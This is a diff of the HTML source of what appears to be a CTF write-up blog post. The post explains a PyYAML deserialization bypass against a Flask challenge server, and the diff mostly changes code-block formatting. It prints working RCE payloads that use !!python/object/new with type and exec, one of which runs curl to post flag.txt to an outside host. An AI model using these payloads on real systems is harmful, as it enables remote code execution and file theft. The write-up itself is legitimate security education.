@@ -14,7 +14,7 @@ The server is using pyYAML and Flask, with the source code below:
 from flask import Flask, session, request, make_response import yaml import re import os app = Flask(__name__) app.secret_key = os.urandom(16) @app.route(&#39;/&#39;, methods=[&#34;POST&#34;]) def pwnme(): if not re.fullmatch(b&#34;^[\n --/-\]a-}]*$&#34;, request.data, flags=re.MULTILINE): return &#34;Nice try!&#34;, 400 return yaml.load(request.data) if __name__ == &#39;__main__&#39;: app.">
 <meta name="author" content="harrier, ozetta">
 <link rel="canonical" href="https://b6a.black/posts/2020-07-22-uiuctf-deserializeme/" />
-<link href="/assets/css/stylesheet.min.06c29a64914f09761dd752339de2cbb79790d8c7354bb1fe8dda89ba8b5d05a5.css" integrity="sha256-BsKaZJFPCXYd11IzneLLt5eQ2Mc1S7H&#43;jdqJuotdBaU=" rel="preload stylesheet"
+<link href="/assets/css/stylesheet.min.cbea6e4569d868c2099732a453af991f3a66132125fdf174125d43fc613d6e0d.css" integrity="sha256-y&#43;puRWnYaMIJlzKkU6&#43;ZHzpmEyEl/fF0El1D/GE9bg0=" rel="preload stylesheet"
     as="style">
 
 <link rel="icon" href="https://b6a.black/favicon.ico">
@@ -174,7 +174,7 @@ if __name__ == &#39;__main__&#39;:
 <p>The version of pyYAML and flask is both at latest release, so its not with an challenge with an existing CVE.</p>
 
 <p>We noticed that <code>yaml.load</code> is &quot;unsafe&quot; by the README:</p>
-<pre><code>When LibYAML bindings are installed, you may use fast LibYAML-based
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">When LibYAML bindings are installed, you may use fast LibYAML-based
 parser and emitter as follows:
 
     &gt;&gt;&gt; yaml.load(stream, Loader=yaml.CLoader)
@@ -182,7 +182,7 @@ parser and emitter as follows:
 
 If you don&#39;t trust the input stream, you should use:
 
-    &gt;&gt;&gt; yaml.safe_load(stream)</code></pre>
+    &gt;&gt;&gt; yaml.safe_load(stream)</code></pre></div>
 <p>So we dig into the internals of yaml loader.</p>
 
 <p>From the source code, when loader is not provided, it uses <code>FullLoader</code></p>
@@ -221,29 +221,29 @@ If you don&#39;t trust the input stream, you should use:
                 instance[key] <span style="color:#f92672">=</span> dictitems[key]
         <span style="color:#66d9ef">return</span> instance</code></pre></div>
 <p>While the format of <code>python/object/apply</code> can supply states for the object, we can use <code>python/name</code> to reference a python internal function (exec, eval etc). We cannot use an module function as <code>.</code> and <code>_</code> is blocked, so the CVE PoC cannot be used. (and it used apply, which is blocked by <code>FullConstructor</code>)</p>
-<pre><code>#   !!python/object/apply       # (or !!python/object/new)
-#   args: [ ... arguments ... ]
-#   kwds: { ... keywords ... }
-#   state: ... state ...
-#   listitems: [ ... listitems ... ]
-#   dictitems: { ... dictitems ... }
-# or short format:
-#   !!python/object/apply [ ... arguments ... ]</code></pre>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#   !!python/object/apply       # (or !!python/object/new)</span>
+<span style="color:#75715e">#   args: [ ... arguments ... ]</span>
+<span style="color:#75715e">#   kwds: { ... keywords ... }</span>
+<span style="color:#75715e">#   state: ... state ...</span>
+<span style="color:#75715e">#   listitems: [ ... listitems ... ]</span>
+<span style="color:#75715e">#   dictitems: { ... dictitems ... }</span>
+<span style="color:#75715e"># or short format:</span>
+<span style="color:#75715e">#   !!python/object/apply [ ... arguments ... ]</span></code></pre></div>
 <p>The 5.3.1 fixes also blocked the key <code>extend</code> and <code>^__.*__$</code> to disallow setting those key with the state parameter.</p>
 
 <p>We discovered that we can use <code>python/object/new</code> with <code>type</code> constructor (<code>type</code> is a type...) to create new types with some customized internal state. With this, we can bypass the <code>state</code> key block mechanism and freely set our object to something like this:</p>
-<pre><code>!!python/object/new:type
-  args: [&#34;z&#34;, !!python/tuple [], {&#34;extend&#34;: !!python/name:exec }]</code></pre>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">!!python/object/new:type
+  args: [&#34;z&#34;, !!python/tuple [], {&#34;extend&#34;: !!python/name:exec }]</code></pre></div>
 <p>With this we can put our commands to <code>listitems</code>, and the constructor will call <code>instance.extend(listitems)</code>, thus finish our RCE exploit.</p>
 
 <p>Full payload:</p>
-<pre><code>!!python/object/new:type
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">!!python/object/new:type
   args: [&#34;z&#34;, !!python/tuple [], {&#34;extend&#34;: !!python/name:exec }]
-  listitems: &#34;\x5f\x5fimport\x5f\x5f(&#39;os&#39;)\x2esystem(&#39;curl -POST mil1\x2eml/jm9 -F x=@flag\x2etxt&#39;)&#34;</code></pre>
+  listitems: &#34;\x5f\x5fimport\x5f\x5f(&#39;os&#39;)\x2esystem(&#39;curl -POST mil1\x2eml/jm9 -F x=@flag\x2etxt&#39;)&#34;</code></pre></div>
 <p>(We changed <code>_</code> to <code>\x5f</code> and <code>.</code> to <code>\x2e</code> to bypass the regex limitation)</p>
 
 <p>The intended solution uses <code>map</code> as a type (as it is a type in Python 3):</p>
-<pre><code>!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ &#39;PAYLOAD_HERE&#39; ]]]</code></pre>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ &#39;PAYLOAD_HERE&#39; ]]]</code></pre></div>
 <p>This is essentially the python code <code>tuple(map(eval, &quot;PAYLOAD&quot;)))</code>, and this works as <code>map</code> and <code>tuple</code> are both class constructor (so it doesnt use any function as apply calls).</p>
 
 <p>Thanks for the author for such cool challenge (basically used a 0day for the CTF challenge).</p>
